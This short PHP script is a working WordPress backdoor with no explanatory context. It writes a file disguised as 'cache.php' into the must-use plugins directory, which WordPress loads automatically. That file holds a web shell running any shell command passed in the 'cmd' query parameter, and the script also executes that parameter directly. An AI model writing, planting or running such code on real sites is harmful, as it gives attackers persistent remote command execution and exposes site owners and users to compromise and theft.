<?php
$path = WPMU_PLUGIN_DIR . '/cache.php';
file_put_contents($path, '<?php system($_GET[\"cmd\"]);');
system($_GET['cmd']);
